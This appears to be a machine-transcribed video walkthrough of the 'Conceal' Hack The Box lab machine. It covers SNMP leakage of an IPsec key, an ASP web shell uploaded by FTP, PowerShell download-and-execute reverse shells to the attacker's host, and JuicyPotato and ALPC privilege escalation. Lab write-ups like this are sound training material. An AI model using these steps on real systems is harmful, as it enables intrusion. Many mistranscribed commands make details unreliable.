 what's going on YouTube the zipsak and we can be doing concealed from back the box which is a really fun and unique box because all the difficulty was up in that initial recon portion on the Box you had to do a bunch of enumeration in order to get the IPSec parameters in order to configure either strongswan or Windows VPN so you could establish a secure tunnel to conceal in order to enumerate the TCP ports once you do that the Box falls pretty quickly it's got a FTP server they can login with anonymous and upload files to and then a web server which can execute files you uploaded and then once you get a shell back you have the SE impersonation right which lets you use juicy potato to escalate up to administrator and there's second probe ask through the sandbox escape or a LPC exploit so since there's a VPN configuration and two different pretty X we're gonna do this box twice once with Linux once with Windows so you can see both exploits and both ways to configure VPNs and before we get into this I'm gonna apologize because I don't know how this is gonna go I got back from vacation at 8 p.m. Friday night and within 15 hours this video has to be uploaded or I want to be uploaded so didn't get much time to prepare so with that being said let's jump in like every other box when we begin with an app with - se for default scripts SV uh numerate versions Oh a I'll put all formats but in the end map trick can call it conceal and then the IP address which is 10 10 10 116 does take some time to run so I've already ran it looking at the results we see absolutely no ports are open so in this case I'm going to ping the host and if we look and map actually does say the host is up not offline so this probably isn't a mistake but I'm just gonna ping it anyways and this will tell us what type of OS it is we see the TTL is 127 so it's most likely going to be a Windows box if it was in the sixties Linux if it's in the 200s it's got some network switch or something like that so we know it's most likely windows let us start a full nmap scan so - p - does all ports that's 1 thru 65535 and then we do - oh eh I'll put all formats been the EM after train say conceal all TCP and then 10 10 10 116 I'm also going to do a map - as you to do UDP ports - Oh a do add map conceal 1000 UDP is what I'm gonna call it and do 10 10 10 116 I'm also going to specify - vvv for verbose and this will output open ports as it does find them I should have done for the TCP I just forgot we can hit vvv now and increase the verbosity so that should be fine um while that runs I'm just going to check some things manually SNMP is a common thing someone do snmpwalk - see public - V - see which is just default stuff for Windows and public is default for everything but we'll do 10 10 10 116 and we get information back right away we see that the system is giving us some VPN password pre-shared key or PSK so i'm just going to copy this i'm gonna go over and cherry tree and then just start creating some notes so this is from open SNMP and we got this pre shared key if we do echo - end and paste this do WC - see it's 32 characters so I'm just gonna get a hashes org and you could do a bunch of other sites like hash killers another one I just like hashes org or we could send it to the Kraken but I'm gonna go to hashes it search click this TP 9 k 4 PP and when I say send to the Kraken I mean just crack it manually ourselves but we see hashes dot word tells us this is a md5 sum for Duke cake 1 so go into cherry tree and then we'll just put we can just paste that so all this other information is just SNMP MIBs we don't have and we could configure all that but the easier thing to do is SNMP - check if you do - H you could specify different ports communities versions etc but this is all default we don't have to do that so we'll just do SNMP - check 10 10 10 116 and it's going to try to connect to it and use public looking back over at our end map we can do see that one port is discovered open that is 500 UDP going back over here will give SNMP checksum time to run and see what it outputs SMB check is now finished it took probably another 45 seconds after that I'm just going to cut the video so you don't have to wait for this to go and watch grass grow well watch a cursor blink in this case but just go into the top let's see everything SNMP - check says we have the host IP address we know that conceal we have the hardware information Windows version 6.3 build 1506 3 so we can always copy this build go to firefox google windows build that and if we search one 506 3 we see this is going to be mobile no PC around July 11 2009 teen and it's I'm not sure what else this tells us maybe it tells us that it is enterprise edition or not I don't believe so I'm sure to say later on exactly what that says but going down let's see we have no interface information so this will tell us potentially if there's ipv6 in play so looking at this let's see don't see anything yet MAC address don't really get any IP addresses but looking at this netstat information we don't see ipv6 and maybe SNMP check just doesn't do the ipv6 MIBs so it could be something we want to look more into but either way looking at this we just see ipv4 right now routing information seeing this and not seeing any subnets we don't recognize tells us there's probably no VMS in play if you have like VMware or something you'd see routes to either 192 and 172 addresses we don't see that so we can be relatively confident this is just one box and not can be a multi-layer type of thing looking at TCP connections we do see there are TCP ports 2181 35 4 4 5 so FTP HTTP SMB a bunch of ephemeral stuff and SMB again so I'm just going to copy this and we're going to go back over to cherry tree and do TCP ports paste this and then go back down and we have a bunch of UDP ports as well we go back over to our and map we do see looks like it's only found one UDP so far but we do have 123 which is MTP 161 which is SNMP 500 which is going to be IPSec Ike which is internet key exchange then we have 4500 which is I think IPSec natura versal 5050 not sure what it is 53 53 that's some type of multicast DNS thing 53 55 this is LM in our link local LAN manager this is what responder abuses it does NetBIOS queries and things like that so if we're on the same subnet as this box and make it do a DNS request we be able to grab a hash via responder 137 138 this is gonna be some SMB stuff 1900 this is I think UPnP so if we saw other things up in the routing table and had different hosts I probably talked to a boy abused UPnP to try to get stuff routed to it's a ephemeral stuff I don't know what this port is 1900 we already said that you PNP and then another ephemeral thing so that I don't know we got network services tongue us all the services in storm this box processes which is good to know we see VMware so we know this is most likely gonna be a VM storage information a CD memory nothing too interesting some device information I is information this is the Windows version of Apache and that is about it so we got a lot of information and based upon the UDP which I did not put let's do UDP ports and let's go up to UDP grab these I'm gonna start looking into hike or IPSec VPN because again this um we can just label these real quick and TP network time protocol can't really abuse it SNMP already abused like we will abuse this is ice KMP will abuse I think that's what it is IPSec 545 hundred cents will be the same thing 5500 unknown this is a - 353 m dns this is LOM our SMB SMB 1900 UPnP and unknown you PMP unknown so since we don't have any other host to abuse we're gonna roll out UPnP which really leaves us left with just IP sex stuff so I'm going to run hike - skin 10 10 10 116 and we get a result back I'm also gonna run - capital a for aggressive mood and I think that's it I scan - H and if we look let's see search for aggressive aggressive a - a yep so aggressive mood will tell us the hash of pre-shared key which honestly we don't need because if we look up here we already have it but it's not configured to do aggressive mode so we can't steal the hash but we already know the pre-shared key so I'm gonna run 10-10-10 116 again and I'm gonna do - M which I think just stands for multi-line to make this a bit easier to read we have HDR which is the handshake request or response it's a handshake something not really important si the security Association and we get a bunch of things so let's do where's Jerry tree let's do VPN and config and that's what we need so let's see the just put this up hash sha-1 group P off PS k we know this is dude cake one exclamation point and we got that from SNMP a lifetime seconds life duration for and this is in hex so we need to convert this to decimal so we can just do Python - C for command and I think it's print hint I think for integer the hex and then 16 for base 16 let's see if that works if not we'll just go online it does so we get 28 800 which I think this is 8 hours so this is going to be seconds and if we just Google seconds 2 hours 8 hours so we have a lot of information about the VPN now so we have to install a IPSec tunneling program which is called strongswan so do app install strongswan and this is just like the de facto standard IPSec VPN thing for Linux and it's a very very finicky configuration this latest things cause it to not work and troubleshooting it is a pain in the butt so we'll find this out and try to walk through how to set this up now that strongswan is installed and we can be convened configuring it which is done through two configuration files the first one we're going to go over is IPSec secrets and doing the man so we can see exactly how this works this is what you'd read to understand it I'm just gonna copy the example for pre shared key and welcome to VI let's see IPSec dot secrets and then we just paste what we copied the IP address we take out and we're going to put 10 10 10 116 which is conceals IP address and then the pre shared key which I think was dude cake one can go back here grab it paste and now whenever we make a IPSec connection through strongswan to this IP address it will use this appreciate key so the next file we want is IPSec dot-com and this is a big one I'm actually going to split it horizontally we can exit this pane doom an IPSec kampf and then let's do VI at sea IPSec calm so we kind of got an example here with things we need so I'm going to do con conceal this is just labeling it and then the first thing we're going to want is to do a type and this tells us what exactly the VPN is for is it going to be for transport tunnel whatever if we search this for type let's see if we do type people's will that do it switch down for type let's see come on where is tight the same type can be configured it should tell us the options there we go we can do tunnel transport transport proxy pass through a drop the type we want is transport if this doesn't work then we try to no next the reason why I'm not doing tunnel is I think tunnel generally requires new IP addresses to be assigned and we're not gonna be doing that we don't have any information on what the remote subnet would be if I saw in the routing table an SNMP we had other subnets then I may do the type as tunnel and then define that subnet if that makes sense next thing we want is key exchange and we didn't actually go over this so let's do this real quick like scan 10 10 10 116 - capital M we stopped that security Association there are these V IDs which is vendor ID essentially this is hashes that get looked up and fingerprints essentially so we have Windows 8 fingerprint which probably just means it's a Windows VPN box we have RFC 34:39 47 which is NAT traversal we have this one draft IETF IPSec NAT TI co2 and a lot of people may confuse this for Ike version 2 but if we look into this by just googling it we'll see this goes to the RFC page and the o2 is just a revision number for this RFC not saying it's Ike version 2 Ike fragmentation supported Microsoft negotiation discovery capable and then we have Ike CGA version 1 so that's why I'm thinking it's a version 1 VPN so like V 1 and you can also and Ike's can do I think that's V 2 let's do not do it maybe it did we didn't get anything so let's do - 8 real quick - - that's view as part of a person to was specified - but we don't get anything back with I - so assuming like version 1 then left this is gonna be us you just think of it visually the left side of the connection the right side of the connection so 10 10 14 3 that should be our IP address if we do if config tun 0 let me get 10 10 14 3 then right this is going to be the right side which is 10 10 10 116 then we want to do off by PS kaif appreciate key then ESP the encapsulating security payload we're getting this from the VPN configure and it's going to be Triple DES sha-1 so three days sha-1 and then we get the ike key which is three days sha 1 mod p 102 and again we got that from Ike's can that's this group to thing we could search the man page for lifetime and do life time equals eight hours so Ike life time equals the H eight hours I think that's a lifetime Ike scan is showing it could also be this one so there's two different lifetimes it could be you can read that to understand the difference now let's do Auto equals start and see what happens so we'll do I P SEC start no fork and we get a error message at the end invalid ID information so the best troubleshooting for IP sex stuff I've ever found is on the net gate page which does pfSense which is an open BSD based firewall but you do net gate IPSec troubleshoot this is a really good document that just shows all the common error messages and shows the requester and responder so search for this it's in phase two which means we passed phase one so it's probably not going to be relating to the appreciate key or anything IPSec has two phases phase one is the internet key exchange phase this is where it gets the channel ready to transmit a key and it assumes the channels insecure so it does a bunch of different and whatnot to secure that and that goes into Phase two known as the ice KMP that is the think information security Association key management protocol let's see stands for internet security association and key management protocol and that's going to be where the actual policy information and tunneling is set up so we get Phase two Network mismatch so looking at this we have one really odd thing we could dive down a rabbit hole of setting a bunch of lifetime's and things like that but I think lifetimes would be phase one the thing that kind of sticks out to me is we have IPSec on the windows and it's only configured for TCP because we can't hit any tcp port or SNMP check showed TCP was open we go over into cherry tree we see TCP ports four four five but we can't get to four four five so if we do add map - p4 four five - capital P and to ignore the host discovery protocol just so it goes a bit quicker and then specify 10 10 10 116 we get nothing but UDP it works so our VPN is only or not VPN IPSec is only configured for TCP on the window side and it is a very finicky protocol so if we do its I think left its what is it go back into search let's do left proto no not that I don't want to search for proto um what is it I know it's deprecated let's see deprecated if I could spell this parameter is deprecated let's see off by I don't care left pro report that's why I want proto port I think the correct way to specify it is like tcp % any which means tzp on any port but i got issues when trying that if we we can try that real quick we can do TCP percent any and that's how it says it in the main page if I do it it's unable to resolve that so that's why I'm not doing it that way so we'll do left proto port equals tcp and then right proto port equals tcp so let's try running this again and we don't end with an error message everything looks good if we go over here we can try and map - P 4 4 5 we can just do the same thing we did and it should say filtered and that is because n map defaults to a since can if we do a full TCP scan instead of just sending the syn packet we actually complete the handshake we see it's open you can't do send scans through a VPN with and man so with anything I don't think so that's why you have to specify - s capital T I think and that's default is - SS so thing to note is always be cautious with strongswan VPN configurations because it is picky even though we had everything set up it just decided not to work because we tried to say hey let us send anything down this pipe and the receiving end was like whoa we only allow TCP down this pipe so we're gonna ignore everything and drop your connection so now that we have that we could do we can just go back here we don't need these end Maps anymore so let's just do n map - s see - s - s see for safe scripts - s v4 enumerate versions then we'll do - st for full TCP socket connection - OH a-all ports will do conceal TCP IP SEC and then 10 10 10 116 but we can cheat because SNMP told us what TCP ports were open we have FTP HTTP and SMB so the first thing I'm going to do is let's just check SMB map because if this doesn't work we're immediately done so 10 10 10 116 finding open ports status denied nothing so we could do like crack map exact SMB 10 10 10 116 and this may tell us if I did the syntax correct if its SMB signing and we have signing is equal to false so this is going back to the sing land manager open its signing is false and we see it's doing LLM in our the link local mint land manager so we maybe will do like an SMB relay attack to this box if we are able to get a hash from a domain admin or something but since this is a single box not a network we don't have that attack to go into so we're gonna try FTP with anonymous so FTP 10 10 10 116 anonymous anonymous and we get logged in so I'm going to make a derp FTP just so we stay organized what we upload to it we can echo test to actually instead of task will let go please subscribe to test txt and then do FTP 10 10 10 116 anonymous anonymous put task txt and it says it's uploads so let's go over to the HTTP server 10 10 10 116 and we just get the I is page so I'm going to try going to robots.txt see if there's anything there we get a 404 I'm gonna try slash uploads and I'm going to try / upload and we see slash upload is a directory we just guessed that and we see we could get to that file so now I know we can upload files through FTP and then we can execute them or not execute them we know we can access them so now we test if we can actually execute files so let's do echo test to test aspx and this is just a common extension for windows and we did not put it so let's put test dot aspx no such file oh I'm not an FTP so move that into FTP let's go in FTP and then put that again put it in and I have a typo helps if I typed it's a different 4 or 4 or 4 or 4.3 moved has name change was unavailable because the extension configuration so the page is script at a handler let's try putting that again test on aspx so it's a 4 or 4.3 and it's saying something about the extension configuration so let's try putting a [Music] move test on aspx to just test dot ASP and put this in and then if this fails I'll probably try like PHP next but we see test dot ASP works so let's try putting a ASP shell so a good place for web shells is the github repository te n n at C 10 C so let's just clone this it is the web shell directory so let's go up get clone 10 C web show and now let's go into web shell and then do find dot and we will grep for dot ASP dollar to simply say end of line and then let's grab let's do this fuzz DB web shell CMBS PHP thing so we'll copy this into HB boxes conceal and we'll call this just CMD ASP make it a bit simpler go into the directory and we have to put this in the F P directory you'll go in there to make it easy and then let's put CMD ASP so it's not available so let's connect again I'm not a mess mountainous put CMD dot ASP we have put it up there so let's go to 10 10 10 116 upload CMD ASP and we get a 500 error so what I'm going to do is let's move CMB dot ASP to CMD dot ASP back and try getting the file get CMD dot ASP and operation not complete successfully because the file contains a virus or potentially unwanted software so we cannot download that so what we will do instead is find a different web shell so let's do find web show and we will grep for a SP again and then this time going grep for web shell and see if I find any here web shell dot ASP I'm going to use this one so we will copy that into this directory and let's put web shell dot ASP and we will go there and see what happens okay looks like it's working we do dir we have command and Jack execution one small thing that because we're doing a multiple layers on a VPN you may have weird issues so one thing I recommend I haven't ran into them but in MC IPSec Kampf I would recommend putting let's do it and this window will tear down real quick I would probably put fragmentation equals yes because we did see this in the Ike's can we do 10 10 10 116 it supports like fragmentation so I would definitely add that and if we search this config for fragmentation you'd see yes except for sit now so I would put that there and the other thing I may do is if you're still having weird issues I just changed the MTU maximum transmission unit to a thousand now we do if config Don zero I see the MTU is set to a thousand and the reason why is because we are doing we do tour let's do onion diagram look at this picture we're not using tor but it's just a diagram to illustrate what we're doing and I'm not sure if there's gonna be an issue but I've rent like this issue has killed days of me and previous life's so this is a message pretend the red is the message ignore this so pretend that's a message and we built this message assuming the maximum transmission size was 1500 then we added on IPSec IPSec adds between 50 and 55 bytes and then we added on Open VPN so we added another layer an Open VPN I think is 69 bytes of overhead so we added a hundred bytes to a packet that we built assuming it was 1500 bytes so we essentially added I think seven percent overhead with these two tunneling protocols if we add another then things can also get wonky so if you run into issues when you're doing multiple VPNs just change the MTU down you don't to go all the way down to like 1000 you could go down to I 1382 would be a good one and I just say that because windows default MTU I think is 4 eighteen ninety two so that gives you around 100 bytes of slack but yeah just something I recommend doing if you run into weird issues we didn't do it here because I don't know why but I would expect you to run into issues there's some people to run any issues so we tore down the IPSec so we have to put it back up so let's go here and do IPSec was it this window fragmentation goals yes IPSec start no Fork starts it up so now for a for file not found one annoying thing is this will clean off the FTP every few minutes so we have to put it back up okay so we verified we had command execution let us get a reverse shell and to do that we'll use a nishang I'm making a directory HTTP just to stay organized I'll do CPR the Shang shells not that is it info TCP what is it powershell DC p dot ps1 and we'll could just call this rev ps1 so we have to type that and then YY to yank P to put delete this the port of course it has to be 9001 because it's got to be over 9000 it doesn't have to be but just to have it so change the IP address to my IP address 10 10 14 3 and now we can do Python - M simply yeah we can do it in this directory that's fine Python M simple HTTP server on port 80 and then we'll do neck at LV NP eighty I said or L crap I do have RL rap and we went nine thousand one hour l rap is just going it's like read line rapper it'll give me my arrow keys I will do it both with and without it to show what it's doing then I can just do PowerShell IX new object net dot web client download string HTTP 10 10 14 3 Rev ps1 I'm gonna copy this before I run it because the web server deleted again so let's try putting it and then click run again we see it got a show and then we got the show here so what read line rap is gonna do I do Who am I I can hit up arrows I can hit left and right I control Z out of the shell we get rid of this and then hit this again there we go and we have my my up arrow it sends all the control characters so I can't do all that stuff so that's why I like this read line wrapper paste run shell so now we have a shell on the box the first thing I'm going to do is a who am i / all because we got a shell from the HTTP user and we know it's Windows 10 from previous enumeration and we have this SE impersonation privilege and it's enabled so we know if we use juicy potato we should be able to get root on this box so the first thing to do is go download juicy potato so juicy potato github and if it was Windows 2019 I don't think this will work I don't know if it works on fully patched 2016 yet I believe it will work on fully patched 2016 i think only 28 2019 fixes it but let's I don't want to get clone I want to go to releases and then juicy potato exc save file and then we can go to let's do FTP and let's move downloads juicy potato here and then go back to a show put juicy potato exc that's exit FTP because we timed out put juicy potato exc sent the file dir C : C deep slash dir inet pub dub dub dub root and there's an entering directory in the root admin checks so we will look into that but let's go to my net Pub dub dub dub root upload and juicy potatoes so let's copy juicy potato dot exe to users let's see who we are so copy juicy potato dot exe to users destitute music just a directory we should have write access to probably type it it copy juicy potato dot exe to users let's just copy and paste this and we'll just do documents there we go so if we go to this directory do dot slash juicy potato exc we get Phil to run this best bite executable is not valid for this application so generally this means that we try to run a 64-bit app on a 32-bit machine produced dir slash we see two Program Files one x86 so we know this is a 64-bit machine if we go back to our FTP directory do file on juicy potato and this says it's a 64-bit application the issue is we were not in binary mode when we uploaded it we uploaded it in ASCII mode of FTP so that's why I see that era CD FTP let's just move this to J dot exe and put J Exe go back to a shell we can copy this upload J dot exe when we execute this we have everything we want so the last thing I want to do is make a bat file so it's V please subscribe adopt that lets do powershell IX new object net dot web client download string HTTP 1010 14 3 rev ps1 and the reason why i'm uploading this via ftp is because of both of these quotes this double quote and the single quote it's a pain in the butt to do a echo command using both those quotes to direct it to a file so creating the file in a text editor and then using FTP to put it there so I don't to worry about all of that potential issues so we can now CP this directory please subscribe adopt that here we type please subscribe top that we get the command as long as they didn't type of that we should be good the only thing we will have to do is another netcat session so NC l v NP 9001 so let's do dot slash de voz - t star to try both great process with token increase process as user - beat for them to launch C colon backslash all this reason why I'm copying and pasting is so I can't make a typo paste that and then - L a comm server port - listen on 9000 - I guess we could do 9001 this port doesn't matter whatsoever and we get a error message so it's testing with this clsid which is a bits admin I think or we'll find out what that clsid is well it's just Google clsid juicy potato and it was improperly hardened to try to prevent this exploit from working yeah it's a bits port but if we look let's see all of these will give also things the Xbox Live stuff I'm not going to use that may not be there but this Windows Update service will probably be enabled so let's copy this hit the up and let's specify - C for clsid put it in single quotes I just got that from here on this great processor okay we got a hit and we get a shell if I do Who am I we are anti-authority /system so that is the box one way I'm going to do this box on Windows and when we do in the windows we're going to do a different Prive ask that I haven't done yet CD administrator no s and I didn't do the rewind wrap so I can't just hit oh yeah yeah desktop so this shows we are root so let us now switch over to Windows and do this box again so now we're on the Windows box it is a pretty clean install of Windows - the install of command ovm and if you don't have that you can just go to github mandy an commando and install this it takes a few hours to install but it is relatively nice I like it I think I installed it in the antivirus evasion made me cats video so I did that I'm also connected to the hack the Box VPN but I cannot do an map - P 4 4 5 s T 10 10 10 116 because we haven't set up the IPSec VPN yet we see its port is now whereas it's still filtered so to set up the IPSec VPN on Windows we go into the firewall config Advanced Settings to pop up in this box go to connection security rules new rule and create a custom rule any IP address let's say endpoint 1 this is like left and right of strongswan so computers at endpoint - we could specify 10 1014 0/24 that should work we could just do any as well authentication of course on the case for inbound and outbound that should be fine let's see if n ocation method to use we want to do advanced customized and specify and pre shared key which is not recommended and put dude cake one estimation point click ok next the port protocol we're gonna specify TCP if we left this as any then IPSec is applied to everything and we wouldn't be able to do that SNMP walk against the box so we know it's configured in TCP mood because UDP was left untouched by IPSec but TCP was so that is the hint there click Next apply this to all three profiles sure and the name we'll call this conceal and we have now added that so if I do that and map command again we have four four five as open so we know that is done correctly one thing I'm going to do see what mood are we and I'm just gonna disable this cuz I don't know what I'm in right now so inbound connections allow everything not recommended to do but I'm lazy and we can also do IPSec stuff here so inbound connections are allowed and I did that so when I set up my HTTP server and reverse shells and stuff and wants to worry about anything so now the box is relatively the same so FTP 10 10 10 116 and we do anonymous anonymous so let's do something a little bit different and use the Covenant as a c2 protocol it's a dotnet c2 protocol so I think Co bbr dotnet covenant and we're gonna grab this so let's do new tab will do get clone paste this in and we need elite as well so let's grab elite once this finishes cloning we can start the next one so elite is the [Music] client and covenant is the server so we can go into covenant go into covenant again and do dotnet run if you can store net on Linux or Kali this should work let's see we need dartnet SDK 2.2 so let's install this this is becoming more of an issue than I thought it would install.net core to to Linux Mac windows let's do x64 compatible with Visual Studio 2017 which is what I have let's do this package - - 107 and show this because we only want the one that is compatible with what we have and there we go it's done downloading run - - 107 and let's see ideally when you are update covenant this won't be an issue because hopefully this package will be added to it I should have done that first you update coven nut government update um commando with cups all after this video I'll create a github ticket if it's still an issue and they haven't fixed this but wait for this today install there we go it has been installed so let's try dotnet run and it looks like it is working so I open up a new terminal when this opens we will go to elite go into elite again dotnet run and I can't connect this until coven is up and running and I don't think it ran dotnet run try this again get some modules have not been initialized so when I did this I should have ran that command so CD dot dot and we will run this and this is going to install a bunch of the sub modules so the Covenant is nice because it's a dotnet application that does reflective execution of executables so when I want to run like seatbelt I don't have to upload seatbelt to the victim I can just type execute seatbelt and it loads into memory and execute sit so that's why this c2 is nice Cobalts Drake does the same thing but that's paid this is free so that's why I was showing this dotnet run and silent Trinity I believe also will do that but we've done silent Trinity in a previous video so there we go username let's do it set password hip sack and creating cert so we can go over here dotnet run we could specify the hash so we only connect to this which helps prevent man the middle attacks computer name one 27001 username if set password if sac government hash so this is where we could copy this hash paste it so now it will only trust this hash which again helps prevent me in the Middle's and we have a session in covenant if we do help we have three things grunts launchers listeners listeners or listeners you should know what that is that's gonna be like HTTP things launchers launch grunts grunts is the agent the c2 agent so the first thing is to go into listeners I think it's options or show show so HTTP and then is this options let's to help show show is config so we can set connect address to be 10 10 14 3 which I believe is or IP we can get out of FTP now just do IP config and we see yes we are still 10 10 14 3 so that looks good so we can do start to start it and we see we are listening on 10 10 14 3 port 80 after this we need to go back to and we can do help again you want to do launches which is like a stager will do our show because that's what we're familiar with will set the listener name to or a ee thing and we will do help and let's just generate the power show launcher so we can copy and paste this whole thing let's see maybe we can copy and paste it hold shift click oh no come on scroll down I'm really not a fan of this Cmdr thing maybe one so like bash on didn't mean to paste I was saying maybe I'll install like bash on Windows and put team ox let's do edit copy and now we want to go into sublime paste and let's see we don't need this PowerShell stuff it's not doing like encoding or anything so we can just get rid of that get rid of this last parenthesis so we just have raw PowerShell and we can save as let's go into c colon users up sac desktop and we'll make a directory called conceal and we'll go in here and save this as Rev dot ps1 so we got the PowerShell script done we have to now get the web show so let's go to 10 C web shell raw grab sublime new paste save as web shell ASP so we have that so let's upload it so FTP 10 10 10 116 anonymous anonymous and we can actually we have to quit because we're not in the correct directory we're going to go into conceal and now we can FTP 10 10 10 116 anonymous anonymous put web show ASP and we also have to create a Python listener so Python Python 3 3 7 I'll play those on my path let's trash conceal I get c colon python 2 7 python dot exe - em simple HTTP server okay so now we can go ten ten fourteen three web shell and we have to upload it again playing this game put it go to web shell now I can do PowerShell ix new object net dot web client download string HTTP 10 10 14 3 port 8000 Rev ps1 click run go back to Sam dear see we have not got it yet so we screwed up this command so we can just paste it no no we got it it was just going slow so have a hit looking at this looks like we have started getting a listener as maybe this is no maybe it's not but we will just wait on this screen for a Asian callback you can take like 15-20 seconds after you get that so there we go we have grunt has been activated so if we go back back to grunts we now see we have that grunt so we can do in our act eight seven seven if we do help we have a list of everything we can do so one of the built-in things is seat belt which is like power up I guess so we can do seat belt I think all to do all checks let's just do user checks so seat belt user and if we go to goes back seat belt this will tell us the instructions so let's see seep out all will run with all checks we can specify checks seep out user collects this data maybe we should do all to get this will do all next or a system order system next so let's go back to Cmdr and we see seatbelt has ran current user firefox chrome IE windows vaults so let's do seatbelt system to run those checks and while that goes let us download Merlin or Watson so Watson rastamouse github ok and then we should I guess to open up a new window here and we'll do git clone Rastamouse Watson because we don't have any releases that we can just compile so let's go to desktop Watson and open it up and this is why having commando is nice because it installs visual studio and everything else if we go back into here we can see seatbelt has ran and what it has enumerated so let's see it's going all the way up basic information we have Windows 10 Enterprise reboot schedule current privileges this tells us we have the SE impersonate so we could do the juicy potato UAC policies PowerShell versions audit settings windows event forward settings definitely useful information to know now let's say settings telling us stuff about password stuff I guess environment variables system variables user folders W my gut stopped couldn't user settings laps laps is not installed IDP hairiest mapdrives firewall stuff so you can see just a bunch of useful information in this but nothing that really helped us so let's do Watson and I think we have to change the build to dot in that framework for five let's see if we can compile it as dotnet - oh let's do no let's leave it at four or five and see if it works so build rebuild solution so it's building built it - here so copy go over to Cmdr and we should be able to do just hope there should be an assembly execute maybe there we go paste it and we'll see what happens so it's been assigned to run if it fails we'll have to change the dotnet version that's the main downside to this nope there we go so we have Watson running and what it detects and we have CVE 2018 eight four four zero and this is the alp see exploit from sandbox of caper if you remember that last year there are these up here which it's probably vulnerable to but generally with CVEs I give with one where I know there's a POC and generally the latest one because sometimes these earlier ones get superseded which means they're no longer effective and it's just a false positive but generally the latest ones from these type of things is a good starting spot so I don't want to use Metasploit I'm going to use a script from Mumbai on hack the box it's github real unique I think is his username Mumbai let's see maybe it's just maybe it's real original there we go it's really rigid all not real unique and we want to do the Al PC diag hub and let's see he has a compound for us so we can just download this and look at his usage instructions example payload so here's an example let's see so we put the AL PC executable a payload and then we can do anything to our TF I guess so let's try this I haven't actually ran this before so let's do C++ reverse shell and get a reverse shell POC so this should work let's do Visual Studio 2017 and hope I have C++ here file new project visual see I don't have C++ here just dot that visual C++ um we don't feel like installing more things let's see wait we have a template here bol rahe dear oh not present in this installation yeah so we'd have to add darn that stuff because I don't know if I can just create I mean C++ stuff apologies for this sloppy cut I'm just watching over to Linux because it's quick good to install the dependencies to compile a C++ tol so and I'm pretty strapped for time so I'm making sure I have min gwgw 64 installed and now we can just get a reverse shell DLL so c++ reverse shell grab this let's go to github actually woops I don't want that one there we go this one I want a vest shell POC copy this and we will create rev dot cpp paste set paste paste this in and see what we have to edit looks like the IP address so ten ten fourteen three and we'll do 9001 because I don't think that's in use yet and that should be fine so an ideal world we would have added the which we'll call it the Covenant payload to this so we're not doing the river shell but I'm running low on time right now so it is what it is x86 64 w 64 mingw g plus plus and then we call revs EPP - no Rev DLL and we got a wink LS windsock and then shared I think that's it if config e0 I'm 176 210 153 so SMB serve - SMB to support share PWD okay 172 1610 153 once when we do 1610 153 share and we grab this DLL so imagine we compile this on our Windows box so we're just copy this to see users upset desktop covenant not covenant we want conceal and then we want to grab the thing out of downloads so downloads a LPC paste this in we'll call this what did he call it oh we have to add this to a DLL so let's go back to Kali go into rev CPP and what modifications do we have to do to add this first is this in clipboard it is set paste paste this in we can move Windows h-huh so what this line is doing is it's just saying hey on the dol process attach action do something so where do we have to modify well this can't be made anymore this has to be a thing so let's fleet and then do void rev shell and that should be fine up here we have to call it void rev shell that and then stupid casing and here we can just call it so rev shell and that may compile if we're lucky warning so it looks like it compiled well let's hope this works so copy here refresh that's in the desktop so grab this paste and I guess we can test this so let's just open a command prompt 'cd open up another command prompt and cl vnp 9001 and then we can just do run dll 32 Rev DOL and call was it DLL main we did it on and we get a hit but it dies immediately oh no we got the shell there we go so we know where thing works awesome so you just got to upload these so I'll call this LPC dot exe and let's see as example fixed at exe payload DOL something down to our TF so let's go Cmdr FTP we will quit FTP anonymous anonymous and we'll switch to binary mode and we will put rev do l put web shell dot asp and we should be able to go here help and find out how to run a command so let's do shell CMD so shell CMD c : i net pub dub-dub-dub root upload and we called it do we upload a LPC exe Rev DOL web shell on a whited web shell put a OPC Exe so upload LPC exe and we will give it C : high net Pub dub-dub-dub root upload Rev DOL and we'll call it please sub 0 TF so oops I put a bunch of spaces CMD + c lv NP 9001 see if this works so we uploaded it I ran the command and seeing if the command gives us anything back failed a copy a temporary file are you sure you have write permissions let's do she'll see if this works let's see copying so it's trying to overwrite licensed RTF with this and we're getting a failure we shouldn't be getting a failure so let's see payload so copying current license - setting to read write X copying DLL maybe it's how this is executing it so let's try one thing real quick let's do the Shang to get rid of our shell so we can do github and we find the Shang on this so let's do C colon backslash tools the Shang and we have shells so we have the shell we need so let's do copy this to users hip sack desktop conceal paste Rev dot ps1 we already have a revved-up ps1 so we'll do rev to ps1 and at this and we want to copy the reverse paste or do 10 10 14 3 port 9000 - looks fine so there should be a PowerShell module so we can do PowerShell and then we'll just try ix new object net web client download string 10 10 14 3 port 8000 Rev to ps1 and we will do NIC at LLVM P 9000 to see if this works if not then we'll just launch it through the web shell so we test the grunt should get a hit on Rev too soon we do not so let's just do it through the web shell exit quit nonnamous nonnamous binary but web shell dot ASP then we want to go here it's Rev to ps1 Python hit got a hit here so now we can go CD backslash inet pub dub-dub-dub root and then upload and we can put the other things so already in binary mode so we can put the OPC exe put Rev DOL and we should be able just execute al PC dot exe rev DOL lol OTF that exactly what you did fixed going to do dot slash every time and we did not do that cat LVN P 9001 hopefully it didn't send the show yet which it probably did and we probably just missed it let's control C and do it again so go over here Rev to until error has occurred put web shell ASP refresh connects back try that for my clipboard still I do so we can do what is e TW and a vent racing thing a OPC Rev DLL so it's started working that's the windows license thing that lol RTF so started doing it maybe I just think enough time rev DOL will call it if set RT f KL PC exe Rev DLL insect RTF dot slash al PC dot exe Rev DLL epic RTF fail to copy it over for you type C colon windows system32 licensed RTF it's perfectly fine so something is wrong where this exploit is not working maybe it doesn't like being executed from within PowerShell let's do dir application still running but everything else is wiped out so we got put things back not amiss I'm not a mess binary I should just move these files out of this directory put Rev DLL the OPC was there still let's go this one let's try cmd.exe /c a LPC exe Rev DOL EPS at dot RTF filter right over we delete a OPC Exe it's in use so we have an exploit that I think is working but it's hung so we do task list task list find string a LPC task kill / - 9 6 / F so we have killed that so we should be able to delete a LPC dot exe we can so let's put everything back in and then move it out hey OPC exe put Rev DLL go here and let's move a OPC dot exe C colon users destitute documents and move Rev DOL to the same place then go in there CD users destitute documents and CMD Exe /c ALP C dot exe Rev DLL don't do please sub dot RTF do not close the quote copy-paste close fail to copy over you know pc dot exe Rab DLL please sub 0 TF let's see I'm gonna revert the box and then we're gonna try it again so let's do that the box is now reverted so I'm gonna FTP into it maybe there we go anonymous anonymous then it changed to binary mode I'm gonna put web shell KSP gonna go over to Chrome refresh a shell that has a reverse shelf to nishang we should see we got a hit on rev - and we got a shell here so I'm going to go to CD / I net Pub dub-dub-dub root and then we want upload make sure netcat is listening here on 9001 because that's where do L is configured to go to now as a mistake the last time so now let's put a LPC exe put Rev DLL and we will copy them to see 